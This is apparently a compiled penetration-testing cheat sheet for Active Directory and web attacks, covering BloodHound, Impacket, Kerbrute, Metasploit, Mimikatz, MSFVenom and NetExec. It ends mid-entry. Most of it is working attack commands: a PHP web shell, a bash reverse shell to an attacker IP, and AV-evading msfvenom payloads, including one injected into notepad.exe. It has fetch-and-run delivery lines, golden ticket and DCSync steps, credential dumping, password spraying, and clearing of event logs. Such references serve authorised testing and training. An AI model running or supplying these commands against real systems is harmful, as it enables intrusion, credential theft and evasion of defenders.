# then browse to http://localhost:8080 (default creds shown by docker on first run)

docs.title: Upload Collection Data
docs.text:
In the CE UI, navigate to:

http://localhost:8080/ui/administration/file-ingest

Click Upload File(s) and drop in the SharpHound/bloodhound-python zip.

docs.title: Common Abuse Paths Mapped by BloodHound
docs.text: Technique Description Tools to Use ACL Abuse Exploit GenericWrite/All permissions on users/groups PowerView, SharpHound GPO Abuse Edit group policy on target OUs Gptpwnt.py Kerberoasting Request and crack SPNs to recover service account creds Rubeus, Impacket AS-REP Roasting Crack accounts without preauth GetNPUsers.py Constrained Delegation Abuse s4u2proxy for impersonation Rubeus, Impacket Unconstrained Delegation Steal TGT from LSASS on a machine with unconstrained delegation Rubeus, Mimikatz Shadow Credentials Add altSecurityIdentities attribute Whisker Resource-Based Constrained Delegation Abuse msDS-AllowedToActOnBehalfOfOtherIdentity Impacket, PowerView

docs.title: Practical BloodHound Usage Tips
docs.text:
• Run BloodHound collection immediately after first internal access to avoid manual recon.
  • Use focused collection flags to minimize detection on monitored networks.
  • Combine BloodHound output with NetExec and Rubeus to execute the full attack path.
  • Export query results for audit trails or reporting.
  • Clean up SharpHound.exe and the zip output from disk post-collection.

Example cleanup:

nxc smb 10.10.10.10 -u <user> -p <pass> --exec "del C:\Temp\SharpHound.exe"
nxc smb 10.10.10.10 -u <user> -p <pass> --exec "del C:\Temp\data.zip"

docs.title: Post-Access BloodHound Workflow
docs.text:
1. Compromise a host inside the domain
  2. Upload and run SharpHound for collection
  3. Exfiltrate the data
  4. Load into BloodHound and analyze attack paths
  5. Identify shortest paths to Domain Admin or privileged access
  6. Execute lateral movement or escalation using NetExec, Rubeus, or Impacket
  7. Clean up all binaries and collection artifacts

docs.title: Cadaver – WebDAV Client
docs.text:
Tip

cadaver http://10.10.10.10/webdav/ opens an interactive FTP-like session. Use put shell.php to upload, ls to list. If the server is IIS, upload .asp or .aspx instead of .php.

docs.title: Connecting to a WebDAV Server
docs.text:
cadaver http://10.10.10.10/path/

If authentication is required, cadaver will prompt for username and password:

cadaver http://10.10.10.10/
Authentication required for webdav on server `10.10.10.10':
Username: test
Password: ****

For HTTPS with a self-signed cert:

cadaver https://10.10.10.10/

To skip SSL verification:

GIT_SSL_NO_VERIFY=1 cadaver https://10.10.10.10/

docs.title: Useful Cadaver Commands
docs.text:
Once connected:

Command Description ls List directory contents cd <dir> Change directory get <file> Download a file put <file> Upload a file mget <files> Download multiple files mput <files> Upload multiple files delete <file> Delete a file mkdir <dir> Create directory rmdir <dir> Remove directory exit Close the session

docs.title: Upload a Reverse Shell
docs.text:
Upload an ASPX web shell to IIS:

put /usr/share/webshells/aspx/cmdasp.aspx

Create a payload:

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > revshell.exe

Navigate to the site to interact with cmdasp.aspx:

http://10.10.10.10/cmdasp.aspx

Find where the shell is stored using the cmdasp.aspx command box:

dir -s c:\

Once you locate revshell.exe, start a listener and execute from the cmdasp.aspx page:

c:\inetpub\wwwroot\revshell.exe

docs.title: Upload a Basic Web Shell
docs.text:
For PHP-enabled WebDAV servers:

put shell.php

Basic PHP reverse shell:

<?php system($_GET['cmd']); ?>

Access in browser:

http://10.10.10.10/shell.php?cmd=whoami

docs.title: Upload with Filename Bypass (if extensions blocked)
docs.text:
put shell.pHp
put shell.ph%00p
put shell.php;.txt

docs.title: Exploitation Workflow
docs.text:
1. Identify WebDAV Support

    nmap -n -sV --script http-iis-webdav-vuln.nse 10.10.10.10
curl -X OPTIONS http://10.10.10.10/

    Look for DAV: 1,2 in response headers.

  2. Connect to the WebDAV Directory

    cadaver http://10.10.10.10/

  3. Check Write Permissions

    ls
mkdir testdir
put testfile.txt

  4. Upload Web Shell

    put shell.php

  5. Execute Shell

    curl http://10.10.10.10/shell.php?cmd=id

  6. Establish Reverse Shell

    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>

docs.title: Misconfigurations to Look For
docs.text:
• Anonymous WebDAV write access (no auth required)
  • Directory traversal via WebDAV pathing
  • Web servers that allow execution of uploaded scripts (PHP, ASP, JSP)
  • IIS with WebDAV and .aspx execution enabled
  • Misconfigured DAV ACLs allowing write from low-privileged accounts

docs.title: Command Line Shells
docs.text: For Windows: PowerShell is more capable but more monitored than cmd.exe. Use cmd.exe for quick recon, PowerShell for scripting and .NET access. On Linux, check echo $SHELL — you may be in a restricted shell.

docs.title: Setting Shell Variables
docs.text:
export IP=10.10.10.10
export URL=http://10.10.10.10

docs.title: Searchsploit
docs.text:
searchsploit apache 2.4          # search
searchsploit -m 12345            # download exploit to current dir
searchsploit -u                  # update database

docs.title: Terminator Shortcuts
docs.text:
• Split horizontal: Ctrl+Shift+O
  • Split vertical: Ctrl+Shift+E
  • Switch pane: Alt+Arrow

docs.title: Impacket
docs.text:
Tip

Most Impacket tools follow impacket-<toolname> domain/user:password@target syntax. For pass-the-hash: impacket-wmiexec -hashes :NTLMhash domain/user@target. For Kerberos auth: add -k -no-pass and ensure /etc/hosts and your Kerberos config point to the DC.

docs.title: Core Syntax
docs.text: <tool>.py [domain/][user][:pass]@<target> [flags]

docs.title: Common patterns
docs.text:
• DOMAIN/username:password@target — domain account
  • username:password@target — local account / no domain
  • -no-pass — empty password
  • -hashes LM:NT or :NT — pass-the-hash (supply NT hash)

docs.title: Authentication Methods
docs.text: Method Syntax Example Plaintext psexec.py 'CORP\admin:Passw0rd@10.10.10.10' Hashes (PTH) secretsdump.py 'user@10.10.10.10' -hashes :aad3...:nt... Kerberos GetUserSPNs.py 'CORP/enum:Pass' -request (or use -k with existing ticket) No password / anonymous smbclient.py 'WORKGROUP/guest@10.10.10.10'

docs.title: Enumerate Shares
docs.text:
smbclient.py 'WORKGROUP/guest@10.10.10.10'

Expected Output:

[*] Querying shares on 10.10.10.10

    ADMIN$

    C$

    Public

docs.title: Download File
docs.text: smbclient.py 'CORP/alice:Passw0rd@10.10.10.10' -command 'get \Users\Public\loot.txt /tmp/loot.txt'

docs.title: Host Files (serve payloads)
docs.text:
smbserver.py PWN /home/user/payloads

# Target can copy: copy \10.10.14.2\PWN\payload.exe C:\Temp\payload.exe

docs.title: psexec (service-based, reliable, noisy)
docs.text:
psexec.py 'CORP\Administrator:Passw0rd@10.10.10.10' cmd.exe

Creates a temporary service on the target (Event ID 7045). Use for reliable interactive shells.

docs.title: wmiexec (WMI, stealthier — no service creation)
docs.text: wmiexec.py 'CORP\svc:Password@10.10.10.10'

docs.title: Alternate RPC-based execs
docs.text:
smbexec.py 'user:pass@10.10.10.10'

atexec.py 'user:pass@10.10.10.10'

dcomexec.py 'user:pass@10.10.10.10'

Try different exec methods if one fails — environments vary (DCOM, Task Scheduler, SMB).

docs.title: secretsdump — remote or offline SAM/NTDS extraction
docs.text:
# Remote dump with creds
impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'

# Pass-the-hash mode (LM:NT or :NT)
impacket-secretsdump 'CORP/user@10.10.10.10' -hashes :0123456789abcdef0123456789abcdef

# DC-only dump (skip SAM/LSA — NTDS.dit via DRSUAPI, much faster on large domains)
impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc.example.com'

# Just domain NTLM hashes (no Kerberos keys)
impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc.example.com'

# From an offline NTDS.dit + SYSTEM hive (e.g., after diskshadow + robocopy /b)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Output: NTLM hashes, cached creds, and (when possible) LSA secrets suitable for offline cracking.

docs.title: samrdump / netview — lightweight enumeration
docs.text:
samrdump.py 'CORP\user:Pass@dc.corp.local'

netview.py 'CORP\user:Pass@10.10.10.10'

docs.title: GetNPUsers — AS-REP Roasting (no preauth)
docs.text:
GetNPUsers.py 'CORP\user:Pass' -no-pass

Finds accounts with DONT_REQ_PREAUTH and outputs hashes crackable offline (hashcat/john format).

docs.title: GetUserSPNs — Kerberoasting (TGS requests)
docs.text:
GetUserSPNs.py 'CORP\user:Pass' -request -outputfile spns.txt

Enumerates accounts with SPNs, requests service tickets (TGS), saves crackable blobs for offline brute-forcing.

docs.title: Ticketer / Kerberos ticket ops (advanced)
docs.text: ticketer.py can craft TGT/TGS tickets in specific scenarios — use only when you understand Kerberos ticket internals.

docs.title: ntlmrelayx — relay captured NTLM auth to target services
docs.text:
# Relay to an SMB host
ntlmrelayx.py -t smb://10.10.10.100 --smb2support

# Relay using targets file & execute module
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access

Typical flow: Run Responder/mitm6 to capture NTLM; run ntlmrelayx to relay to SMB/HTTP/MSSQL and obtain access.

docs.title: mssqlclient — TDS / MSSQL interactive shell
docs.text:
mssqlclient.py 'sa:Pass@10.10.10.10'

# If xp_cmdshell is enabled and you have permissions, you can run OS commands from MSSQL.

docs.title: lookupsid — translate SIDs to accounts & enumerate groups
docs.text: lookupsid.py 'CORP\user:Pass@dc.corp.local' S-1-5-21-...

docs.title: Modules & Scripts You Should Know
docs.text:
# High-value Impacket tools for CTFs/pentests:
smbclient.py, smbserver.py, psexec.py, wmiexec.py,
smbexec.py, atexec.py, dcomexec.py, secretsdump.py,
GetNPUsers.py, GetUserSPNs.py, ntlmrelayx.py,
mssqlclient.py, lookupsid.py, samrdump.py, netview.py,
ticketer.py
  • smbclient, smbserver — file ops & payload hosting
  • psexec, wmiexec, smbexec — lateral execution
  • secretsdump, samrdump — credential harvesting
  • GetNPUsers, GetUserSPNs — Kerberos offline cracking
  • ntlmrelayx — NTLM relay attacks with Responder/mitm6

docs.title: Impacket Cheatsheet
docs.text: Task Command Example Check SMB creds smbclient.py 'CORP\user:Pass@10.10.10.10' List shares smbclient.py 'user:pass@10.10.10.10' Download file smbclient.py 'user:pass@10.10.10.10' -command 'get \\C$\path file' Host payload smbserver.py PWN /home/user/payloads RCE (psexec) psexec.py 'CORP\Administrator:Pass@10.10.10.10' cmd.exe RCE (wmiexec) wmiexec.py 'user:Pass@10.10.10.10' Dump hashes secretsdump.py 'CORP\Administrator:Pass@10.10.10.10' AS-REP roast GetNPUsers.py 'CORP\user:Pass' -no-pass Kerberoast GetUserSPNs.py 'CORP\user:Pass' -request NTLM relay ntlmrelayx.py -t smb://10.10.10.100 --smb2support MSSQL shell mssqlclient.py 'sa:Pass@10.10.10.10'

docs.title: Recommended Operator Workflow
docs.text:
[0] Known creds? Try them against SMB/WinRM.
 ↓
[1] Enumerate shares & services (smbclient, netview).
 ↓
[2] If creds valid → attempt wmiexec (stealth) then psexec (reliable).
 ↓
[3] Dump credentials (secretsdump, samrdump).
 ↓
[4] Domain enum → Kerberos (GetNPUsers/GetUserSPNs) → offline crack.
 ↓
[5] Relay opportunities: run Responder/mitm6 → ntlmrelayx against targets.
 ↓
[6] Horizontal/vertical pivot; collect artifacts.
 ↓
[7] Cleanup & credential rotation.

After first access, collect for BloodHound and harvest token/delegation material; prioritize persistence only when necessary and within rules of engagement.

docs.title: Kerbrute — Kerberos User Enumeration & AS-REP Roasting
docs.text:
Tip

kerbrute userenum --dc 10.10.10.10 -d example.com userlist.txt validates usernames without lockout (Kerberos pre-auth errors don't trigger lockout by default). Start with jsmith, john.smith, jsmith@domain format variations — AD environments vary in UPN format.

docs.title: Syntax
docs.text: ./kerbrute [command] [flags]

docs.title: 1. Enumerate Valid Usernames
docs.text:
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

Expected output:

[+] VALID USERNAME: jdoe@corp.local
[-] INVALID USERNAME: hruser@corp.local

Brute-force usernames with a large wordlist:

kerbrute userenum -d example.com --dc 10.10.10.10 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

docs.title: 2. Find AS-REP Roastable Users
docs.text:
kerbrute asreproast --dc 10.10.10.10 -d corp.local users.txt

Output:

[+] FOUND AS-REP Roastable User: svc_backup@corp.local
$krb5asrep$23$svc_backup@CORP.LOCAL:...hash...

Crack with:

hashcat -m 18200 hashes.txt rockyou.txt

docs.title: 3. Kerberos Password Spraying
docs.text:
kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt --password "Summer2023!"

Output:

[+] VALID LOGIN: jdoe@corp.local:Summer2023!

Good for stealthy single-password attempts across many users.

docs.title: Operational Notes
docs.text:
• Works only if UDP/88 or TCP/88 is reachable
  • Does not require domain join or admin rights
  • Avoids logging on SMB/WinRM — quieter than nxc smb sprays
  • Combine with ldapsearch or BloodHound output to build user wordlists

docs.title: Best Practice Workflow
docs.text:
# Step 1: Enumerate users
kerbrute userenum -d example.com --dc 10.10.10.10 users.txt > valid.txt

# Step 2: Identify AS-REP roastable users
kerbrute asreproast -d example.com --dc 10.10.10.10 valid.txt > roast.txt

# Step 3: Crack hashes offline
hashcat -m 18200 roast.txt rockyou.txt

# Step 4: Try password spraying if needed
kerbrute passwordspray -d example.com --dc 10.10.10.10 valid.txt --password "Welcome1"

docs.title: LDAPSearch — LDAP Enumeration
docs.text:
Tip

Anonymous bind query: ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName. Pipe to grep sAMAccountName for a clean user list. Add -D "user@domain" -w "pass" for authenticated queries.

docs.title: Syntax
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "<user>@<domain>" -w <pass> -b "<baseDN>" <filter> [attributes]
  • -x: Use simple authentication (not SASL)
  • -H: URI of the LDAP server (e.g., ldap://10.10.10.10)
  • -D: Bind DN (user principal name)
  • -w: Password
  • -b: Base DN (Distinguished Name root)
  • <filter>: LDAP filter (e.g., (objectClass=user))
  • [attributes]: Specific fields to return

docs.title: Determine the Base DN
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

Output:

dn:
namingContexts: DC=domain,DC=local

Use this result in the -b flag.

docs.title: 1. Enumerate All Domain Users
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

docs.title: 2. Enumerate All Groups
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)" sAMAccountName

docs.title: 3. Get Group Membership of Specific User
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(sAMAccountName=targetuser))" memberOf

docs.title: 4. Enumerate Domain Computers
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=computer)" dNSHostName

docs.title: 5. Get Password Policy
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=domain)" maxPwdAge minPwdLength lockoutThreshold

maxPwdAge is in 100-nanosecond intervals. To convert to days:

echo "$(( (-1 * <value>) / 10000000 / 60 / 60 / 24 )) days"

docs.title: Output Parsing
docs.text:
Save results for later parsing:

ldapsearch ... > ldap_output.txt

Extract users quickly:

grep sAMAccountName ldap_output.txt | cut -d' ' -f2

docs.title: Full Example
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "svc_reader@corp.local" -w 'Summer2023!' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

Dumps all usernames and group memberships the account can see.

docs.title: Quick Username Extraction Script
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "svc@corp.local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName \
    | grep "^sAMAccountName" | cut -d' ' -f2 > usernames.txt

docs.title: Metasploit Resource Scripts
docs.text: Resource scripts automate repetitive Metasploit workflows. Save a sequence of set and run commands to a .rc file, then: msfconsole -r script.rc. Most useful for setting up persistent multi/handler listeners.

docs.title: Basic Structure
docs.text:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
set ExitOnSession false
exploit -j

Save as handler.rc and run:

msfconsole -r handler.rc

docs.title: EternalBlue Script
docs.text:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run

docs.title: Post-Exploitation Automation
docs.text:
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/enum_system
set SESSION 1
run

docs.title: File Transfer via Session
docs.text:
use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /tmp/
run

docs.title: Run Multiple Scripts in Sequence
docs.text:
for script in /tmp/scripts/*.rc; do
    msfconsole -r "$script"
done

docs.title: Metasploit
docs.text:
Use Metasploit when the exploit module matches the exact target version, you need a stable meterpreter session for post-exploitation, or you need built-in pivoting. Go manual when OSCP rules apply, AV detects the payload, or you need a one-shot exploit without handler overhead.

Watch out

Meterpreter is heavily signatured. On hardened targets, use the shell stage instead, or generate a custom payload with MSFVenom and a custom encoder.

docs.title: Starting Metasploit
docs.text:
msfconsole

# Update (msfupdate is deprecated on Kali)
sudo apt update && sudo apt install --only-upgrade metasploit-framework

docs.title: Searching for Exploits
docs.text:
search smb
search type:exploit platform:windows
search cve:2021-44228

docs.title: Using an Exploit
docs.text:
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit

docs.title: Handling Sessions
docs.text:
sessions -l                  # list all sessions
sessions -i <session-id>     # interact with session

Background a session: Ctrl+Z

docs.title: Meterpreter Commands
docs.text:
sysinfo
getuid
hashdump
shell
upload /local/file C:\\remote\\path
download C:\\remote\\file /local/path

docs.title: Privilege Escalation
docs.text:
getprivs
run post/windows/escalate/getsystem

docs.title: Pivoting with Metasploit
docs.text:
Add an internal route through a session, then start a SOCKS proxy so any tool can reach the internal network:

# 1. Add route via meterpreter session
route add 10.10.20.0/24 1
route print

# 2. Start SOCKS5 proxy (modern replacement for socks4a)
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j

Add to /etc/proxychains4.conf:

socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.10.10

docs.title: Automating with Resource Scripts
docs.text:
msfconsole -r handler.rc

See the Metasploit Resource Scripts page for .rc file examples.

docs.title: Mimikatz
docs.text:
Tip

Always run privilege::debug first before any dump commands — without it, most commands fail silently. If you get ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061, you're not running as admin or token impersonation failed.

Watch out

Mimikatz is heavily detected. Use obfuscated versions (Invoke-Mimikatz from PowerSploit, or mimikatz_trunk with custom compilation) on systems with AV. The PyPy port pypykatz runs without dropping a binary.

docs.title: Setup
docs.text:
Run from an elevated prompt on a domain-joined Windows machine (cmd or PowerShell):

privilege::debug
token::elevate

docs.title: 1. Dump Credentials from LSASS (Memory)
docs.text:
sekurlsa::logonpasswords

Lists credentials currently in memory — including NTLM hashes, clear-text passwords (if cached), and Kerberos TGT info.

When you find a valid username and NTLM hash, attempt to crack it with hashcat. If unable to crack, use evil-winrm to perform a PtH attack and move laterally.

docs.title: 2. Dump Cached Kerberos Tickets
docs.text:
kerberos::list

Extract .kirbi ticket files:

kerberos::list /export

docs.title: 3. Inject a Ticket (Pass-the-Ticket / PTT)
docs.text:
Load .kirbi ticket into memory:

kerberos::ptt ticket.kirbi

Confirm with:

klist

docs.title: 4. Silver Ticket Creation
docs.text:
Prerequisites: NTLM hash of service account, domain name, domain SID, service SPN.

kerberos::golden /user:<user> /domain:<domain> /sid:<domain-SID> /rc4:<hash> /service:<service> /target:<FQDN> /ptt

Example:

kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.htb.local /ptt

docs.title: 5. Golden Ticket Creation
docs.text:
Prerequisites: NTLM hash of krbtgt, domain SID, domain name.

kerberos::golden /user:<user> /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt

Example:

kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

docs.title: 6. DCSync Attack (Dump Hashes Without Touching LSASS)
Dump Administrator Hash
docs.text: lsadump::dcsync /domain:htb.local /user:administrator

docs.title: Dump krbtgt Hash (for Golden Ticket)
docs.text:
lsadump::dcsync /domain:htb.local /user:krbtgt

Requires Replicating Directory Changes privilege.

docs.title: 7. LSA Secrets (Service Account & System Info Dump)
docs.text:
lsadump::secrets

Extracts service account credentials, saved RDP credentials, and cached scheduled task passwords.

docs.title: 8. Extract Domain Cached Credentials (DCC)
docs.text:
lsadump::cache

Useful for offline cracking using hashcat mode 2100.

docs.title: 9. Pass-the-Hash (PTH) via Token Replacement
docs.text:
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe

Example:

sekurlsa::pth /user:svc_sql /domain:htb.local /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe

docs.title: 10. Token Impersonation
docs.text:
List tokens:

token::list

Impersonate SYSTEM token:

token::elevate

Impersonate another user token:

token::impersonate <token_id>

docs.title: 11. Dump All Data in One Shot
docs.text:
log
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /user:krbtgt
kerberos::list /export

docs.title: Full Golden Ticket Attack Chain
docs.text:
# From SYSTEM shell on domain-joined box:
privilege::debug
lsadump::dcsync /domain:htb.local /user:krbtgt
kerberos::golden /user:admin /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
klist
PsExec.exe \\dc01 cmd.exe

docs.title: Summary: Common Use Cases
docs.text: Objective Command Dump LSASS creds sekurlsa::logonpasswords Extract krbtgt hash lsadump::dcsync /user:krbtgt Create Golden Ticket kerberos::golden /krbtgt:<hash> /ptt Create Silver Ticket kerberos::golden /rc4:<hash> /service:<svc> PTT any .kirbi ticket kerberos::ptt <ticket.kirbi> List current tickets kerberos::list Dump LSA secrets lsadump::secrets Impersonate token token::impersonate <id>

docs.title: MSFVenom
docs.text:
For Windows targets with AV, use a staged payload (windows/x64/meterpreter/reverse_tcp) over stageless (windows/x64/meterpreter_reverse_tcp) — staged payloads are smaller and easier to obfuscate. Pair with shikata_ga_nai or a custom XOR encoder.

Watch out

Output format matters: -f exe for Windows, -f elf for Linux, -f raw for shellcode injection. Wrong format = silent failure on execution.

docs.title: List Payloads
docs.text:
msfvenom --list payloads | grep windows
msfvenom --list payloads | grep linux

docs.title: Linux Reverse Shell (ELF)
docs.text: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f elf > shell.elf

docs.title: Windows Reverse Shell (EXE)
docs.text: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe

docs.title: PHP Reverse Shell
docs.text: msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php

docs.title: Windows Shellcode (for injection)
docs.text: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f c

docs.title: Encode to Evade AV
docs.text:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> \
  -f exe -e x86/shikata_ga_nai -i 5 > encoded_shell.exe

msfvenom --list encoders

docs.title: Inject Into a Legitimate Binary
docs.text:
msfvenom -p windows/x64/meterpreter/reverse_tcp -x notepad.exe -k \
  -f exe -o infected.exe LHOST=<attacker-ip> LPORT=<port>

docs.title: Deliver and Execute
docs.text:
# Serve the payload
python3 -m http.server 80

# On Linux target
wget http://<attacker-ip>/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# On Windows target (PowerShell)
iwr -uri http://<attacker-ip>/shell.exe -OutFile C:\Temp\shell.exe; C:\Temp\shell.exe

docs.title: Set Up the Listener
docs.text: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker-ip>; set LPORT <port>; exploit"

docs.title: NetExec
docs.text:
NetExec replaces CrackMapExec

NetExec (nxc) is the actively maintained fork of CrackMapExec (cme). Commands are near-identical — just replace cme with nxc. Use nxc on new installs; cme still works but is no longer maintained.

docs.title: Core Syntax
docs.text: nxc <protocol> <target(s)> [flags]

docs.title: Protocols
docs.text:
• smb – Server Message Block (Windows file shares)
  • winrm – Remote Windows PowerShell
  • ldap – AD user/group enumeration
  • kerberos – For TGT/TGS ticket hunting (w/ --kerberos)
  • mssql, rdp, ssh, ftp, http, imap – Available via modules

docs.title: Authentication Methods
docs.text: Method Syntax Example Plaintext -u user -p pass Hashes (PTH) -u user -H aad3...:hash Kerberos -k -d domain.local (Requires KRB5CCNAME or ticket)

docs.title: Validate Credentials
docs.text: nxc smb 10.10.10.10 -u alice -p Winter2020!

docs.title: Enumerate Shares
docs.text:
nxc smb 10.10.10.10 -u alice -p Winter2020! --shares

Expected Output:

[+] 10.10.10.10:445 - Found 3 accessible shares:
    - ADMIN$
    - C$
    - Public

docs.title: Download File
docs.text: nxc smb 10.10.10.10 -u <user> -p <pass> --get-file "\\Users\\Public\\loot.txt" loot.txt --share C$

docs.title: Upload File
docs.text: nxc smb 10.10.10.10 -u <user> -p <pass> --put-file local.exe "\\Temp\\local.exe" --share C$

docs.title: Dump SAM / LSA / NTDS
docs.text:
Always try these with local admin or DA — often yields immediate credentials or the whole domain:

nxc smb 10.10.10.10 -u Administrator -p <pass> --sam     # local SAM hashes
nxc smb 10.10.10.10 -u Administrator -p <pass> --lsa     # LSA secrets (cached creds, service accounts)
nxc smb 10.10.10.10 -u Administrator -p <pass> --ntds    # full NTDS.dit dump (run against DC)

docs.title: Over SMB
docs.text:
nxc smb 10.10.10.10 -u admin -p 'Passw0rd!' -d DOMAIN --exec 'cmd.exe /c whoami'

Requires admin access.

docs.title: Over WinRM (PowerShell)
docs.text: nxc winrm 10.10.10.10 -u admin -p 'Passw0rd!' -d domain --exec 'whoami'

docs.title: Pass-the-Hash (PTH)
docs.text: nxc smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762 -d domain --exec 'hostname'

docs.title: Kerberos Authentication (TGT-based)
docs.text:
impacket-getTGT domain/user:password
export KRB5CCNAME=/path/to/krb5cc_domain
nxc smb 10.10.10.10 -k -d domain.local --exec 'whoami'

Use for OPSEC-safe access when you already have a valid ticket.

docs.title: AD Enumeration via LDAP
docs.text:
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --users
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --groups

Other LDAP options: --computers, --password-policy, --domain-controllers, --loggedon-users

docs.title: Modules You Should Know
docs.text:
nxc smb 10.10.10.10 -u user -p pass -d domain --modules
  • lsassy: Extracts LSASS credentials via SeDebugPrivilege
  • wmi: Executes WMI queries
  • psremote: Executes PowerShell scripts remotely
  • samdump: Dumps local SAM hashes
  • dpapi: Attempts DPAPI blob extraction
  • credz: Parses saved credentials

docs.title: Cleanup (Post-Exploitation Hygiene)
docs.text:
Remove artifacts:

nxc smb 10.0.0.12 -u user -p pass --exec "del C:\Temp\rev.exe"

Clear Windows Event Logs (noisy — only if absolutely necessary):

nxc winrm 10.0.0.12 -u user -p pass -d domain --exec 'wevtutil cl Security'

Delete a backdoor account:

nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'

docs.title: NetExec Cheatsheet
docs.text: Task Command Example Check credentials (SMB) nxc smb 10.10.10.10 -u user -p pass Enumerate shares nxc smb 10.10.10.10 -u user -p pass --shares List domain users/groups nxc ldap 10.10.10.10 -u user -p pass --users / --groups PTH authentication nxc smb 10.10.10.10 -u user -H LM:NT Kerberos authentication nxc smb -k -d domain.local Execute command (SMB) nxc smb 10.10.10.10 -u admin -p pass --exec 'whoami' WinRM command execution nxc winrm 10.10.10.10 -u admin -p pass --exec 'hostname' Upload file nxc smb 10.10.10.10 --exec 'put local.exe \\C$\Temp\back.exe' Download file nxc smb 10.10.10.10 --exec 'get \\C$\Temp\loot.txt local.txt' Pivot with ProxyChains proxychains nxc smb 10.10.10.10 ... Enumerate AD password policy nxc ldap 10.10.10.10 -u user -p pass --password-policy

docs.title: Recommended Operator Workflow
docs.text:
[0] Known creds? Try them!
 ↓
[1] Validate credentials (SMB or WinRM)
 ↓
[2] Enumerate shares → find loot
 ↓
[3] Enumerate users, groups, computers via LDAP
 ↓
[4] Identify Admin rights → execute payload or commands
 ↓
[5] Pivot internally via ProxyChains or socks
 ↓
[6] Dump creds (lsassy, samdump, dpapi)
 ↓
[7] Cleanup (remove binaries/logs)

After first access, start a BloodHound collection or dump tokens for delegation/impersonation.

docs.title: Nuclei — Vulnerability Scanner
docs.text:
Tip

For web API enumeration: nuclei -u https://10.10.10.10 -t exposed-panels/ -t exposures/ -t misconfiguration/ covers the most impactful templates. Use -severity critical,high to filter noise. Nuclei is much faster than manual checks for known CVEs on large scope.

docs.title: Updating Nuclei Templates
docs.text:
nuclei -update

View available templates:

ls ~/.nuclei-templates/

docs.title: Basic Web Enumeration
docs.text:
Scanning a single URL:

nuclei -u https://10.10.10.10

Scanning multiple URLs:

cat urls.txt | nuclei -l -

docs.title: Identifying API Endpoints
docs.text: nuclei -u https://10.10.10.10 -t http/api/api-endpoints.yaml

docs.title: Scanning for API Keys and Sensitive Data
docs.text: nuclei -u https://10.10.10.10 -t http/exposures/api-tokens.yaml

docs.title: Checking for Open API (Swagger) Exposure
docs.text: nuclei -u https://10.10.10.10 -t http/api/openapi.yaml

docs.title: Detecting GraphQL Misconfigurations
